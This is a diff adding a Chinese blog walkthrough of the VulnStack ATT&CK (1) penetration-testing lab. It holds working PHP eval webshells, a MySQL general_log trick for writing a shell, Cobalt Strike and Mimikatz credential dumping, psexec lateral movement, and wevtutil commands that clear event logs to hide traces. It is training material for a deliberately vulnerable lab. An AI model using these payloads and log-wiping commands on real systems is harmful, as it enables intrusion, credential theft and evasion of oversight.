@@ -5194,4 +5194,84 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
         <tag>靶场通关</tag>
       </tags>
   </entry>
+  <entry>
+    <title>VulnStack-ATT&amp;CK(一)</title>
+    <url>/2026/04/11/VulnStack-ATT&amp;CK(%E4%B8%80)/</url>
+    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p>这是官方给出的靶场拓扑结构图，Web服务器 Win7，内网域控 Win2008，域成员 Win2K3</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/eeLi/1646X794/assets/image-20260226212727-nuc3t7s.png" alt="image"></p>
+<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>然后配置一下 IP，首先打开虚拟网络编辑器配置一下网段，我的配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">VMnet1：仅主机模式，子网地址为 192.168.52.0<br>VMnet8：NAT模式，子网地址为 192.168.100.0<br></code></pre></td></tr></table></figure>
+
+<p>注意：仅主机模式的子网地址最好不要改，否则很麻烦，可能会出一些莫名奇妙的问题，因为域控和域成员这两台机器默认都是 <code>192.168.52.0/24</code> 这个网段的</p>
+<p>kali 和 Win7 的外网网卡使用 NAT 模式；Win7 的内网网卡、Win2008 和 Win2k3 使用仅主机模式</p>
+<p>配置完成后开机，三台机器默认密码都是 <code>hongrisec@2019</code>，打开后强制修改密码，这里修改为 <code>qwe.123</code>，然后三台机器分别 <code>ipconfig</code> 查看 IP，我的 IP 如下：</p>
+<p>注意：Win7 这台机器需要自己去网络和共享中心配置一下，两张网卡都改为自动获取 IP 地址就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">攻击机（kali）: 192.168.100.128<br>外网出口（Win7）: 192.168.100.129 (外网) / 192.168.52.140 (内网)<br>内网域控（Win2008）: 192.168.52.138 (内网)<br>域成员（Win2k3）: 192.168.52.141 (内网)<br></code></pre></td></tr></table></figure>
+
+<p>然后 Win7 这台机器需要去 <code>C:\phpStudy</code> 路径下启动小皮面板，开启 web 服务</p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用 nmap 扫描一下 Win7 这台外网靶机的端口开放情况，发现开放了 80 和 3306</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nmap -sS -sV -Pn 192.168.100.129<br></code></pre></td></tr></table></figure>
+
+<p>访问 80 端口，发现是一个 phpStudy 搭建的默认页面</p>
+<p>用 dirsearch 扫一下目录，有一个 <code>/beifen.rar</code> 文件和 <code>/phpMyAdmin/</code> 路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python dirsearch.py -u http://192.168.100.129/ -i 200<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[23:49:59] 200 -    3MB - /beifen.rar<br>[23:50:12] 200 -   71KB - /phpinfo.php<br>[23:50:12] 200 -   32KB - /phpmyadmin/ChangeLog<br>[23:50:12] 200 -    2KB - /phpmyadmin/README<br>[23:50:13] 200 -    4KB - /phpMyAdmin/<br>[23:50:13] 200 -    4KB - /phpMyadmin/<br>[23:50:13] 200 -    4KB - /phpMyAdmin/index.php<br>[23:50:13] 200 -    4KB - /phpmyadmin/index.php<br>[23:50:13] 200 -    4KB - /phpmyadmin/<br>[23:50:13] 200 -    4KB - /phpmyAdmin/<br></code></pre></td></tr></table></figure>
+
+<p>先访问 <code>/beifen.rar</code>，下载拿到 yxcms 的源码，猜测该站点路径为<a href="http://192.168.100.129/yxcms/"> </a><code>http://192.168.100.129/yxcms/</code></p>
+<p>公告这里直接给出了后台地址和默认账号密码 <code>admin/123456</code>，直接登陆即可</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/J2qK/2004X675/assets/image-20260226235828-f2auq6i.png" alt="image"></p>
+<h2 id="YXcms漏洞利用"><a href="#YXcms漏洞利用" class="headerlink" title="YXcms漏洞利用"></a>YXcms漏洞利用</h2><p>登陆到 yxcms 后台后，在 <code>全局设置-&gt;前台模板</code> 处可随意修改 php 文件</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/z2pU/2002X858/assets/image-20260227123511-zntkjg8.png" alt="image"></p>
+<p>我这里新建一个 shell.php 文件，写上一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在泄露的源码文件中找到模板文件的路径，访问木马文件，然后蚁剑即可成功连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://192.168.100.129/yxcms/protected/apps/default/view/default/shell.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="phpMyAdmin漏洞利用"><a href="#phpMyAdmin漏洞利用" class="headerlink" title="phpMyAdmin漏洞利用"></a>phpMyAdmin漏洞利用</h2><p>目录扫描发现了 <code>/phpMyAdmin/</code>，访问是 phpMyAdmin 后台，弱口令 <code>root/root</code> 成功登陆</p>
+<p>利用 nday 漏洞，直接写入文件 getshell，命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">show variables like &#x27;%secure%&#x27;;<br>SET GLOBAL general_log=on;<br>SET GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/shell2.php&#x27;;<br>SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>此时，日志文件已经被我们修改为 <code>shell2.php</code></p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/lk47/1675X566/assets/image-20260227130235-9nygqjh.png" alt="image"></p>
+<p>执行如下命令将一句话木马记录到日志文件中，再访问 <code>shell2.php</code> 即可成功 getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">SELECT &quot;&lt;?php @eval($_POST[&#x27;b&#x27;]);?&gt;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/6HBK/1533X548/assets/image-20260227130725-55uxz2g.png" alt="image"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h2><p>首先 kali 启动 CobaltStrike 的服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./teamserver 192.168.100.128 liebert<br></code></pre></td></tr></table></figure>
+
+<p>打开 CobaltStrike 客户端，配置好信息即可进入，创建好监听器后生成 Stageless 类型的可执行后门</p>
+<p>将生成的木马通过蚁剑上传至 Win7 这台 Web 服务器上，直接执行即可成功上线 CS</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/0M3s/1530X699/assets/image-20260227132931-8tlid6o.png" alt="image"></p>
+<p>上线的用户是 Administrator 权限，右键提权至 system 权限（提权至 system 权限是为了后续能够运行 Mimikatz 抓取内存中的明文密码，普通 Administrator 权限有时会受到权限限制）</p>
+<p>然后将 Sleep 间隔设置为 1 s，以提高操作响应速度，之后就能正常执行命令了</p>
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>拿到最高权限之后，先简单信息收集一下</p>
+<h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell ipconfig                //查看网络<br>shell net user                //查看本地用户<br>shell net config Workstation  //查看当前计算机名、域、登录域等信息<br>shell net view /domain        //看看几个域<br>net view                      //显示当前域中的所有计算机<br></code></pre></td></tr></table></figure>
+
+<p><code>net view</code> 可以看到当前域中有三台机器，OWA 是域控，ROOT-TVI862UBEH 是普通域成员，STU1 是当前被控机器，存在双网卡，<code>shell ipconfig</code> 命令可以看到内网 IP 为 192.168.52.140</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/5e75/1335X277/assets/image-20260227194906-wybe583.png" alt="image"></p>
+<h3 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h3><p>CS 自带 Mimikatz 插件自动拿到三台机器的密码，这里我自己设置的，均为 <code>qwe.123</code></p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/cQU7/1556X497/assets/image-20260227200451-miq879r.png" alt="image"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>CS 自带端口扫描插件，发现三台机器都开放了 SMB 协议的 445 端口</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/MQCM/1429X235/assets/image-20260227195914-f1ljhlq.png" alt="image"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>端口扫描发现另外两台机器的 445 端口开放，可以利用 SMB 管道进行远程服务安装实现上线</p>
+<p>首先创建一个 SMB 监听器，然后打开菜单栏的 <code>视图 -&gt; 目标列表</code>，右键使用 psexec 横向移动，选择域控机器和刚创建的 SMB 监听器</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/oBwm/1858X528/assets/image-20260227201713-wigj8wb.png" alt="image"></p>
+<p>另一台机器用相同的操作来横向移动获取 system 权限，至此，成功获得 3 台靶机的最高权限</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260411/qljI/1238X486/assets/image-20260227202222-v2wewpk.png" alt="image"></p>
+<h1 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h1><p>在完成所有既定目标后，我们需要对攻击过程中产生的日志、工具、服务进行清理，避免被管理员溯源。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">shell wevtutil cl security               <span class="hljs-comment">//清理安全日志</span><br>shell wevtutil cl system                 <span class="hljs-comment">//清理系统日志</span><br>shell wevtutil cl application            <span class="hljs-comment">//清理应用程序日志</span><br>shell wevtutil cl <span class="hljs-string">&quot;windows powershell&quot;</span>   <span class="hljs-comment">//清除power shell日志</span><br>shell wevtutil cl Setup                  <span class="hljs-comment">//清除事件日志中的 &quot;Setup&quot; 事件</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>靶场通关</tag>
+      </tags>
+  </entry>
 </search>
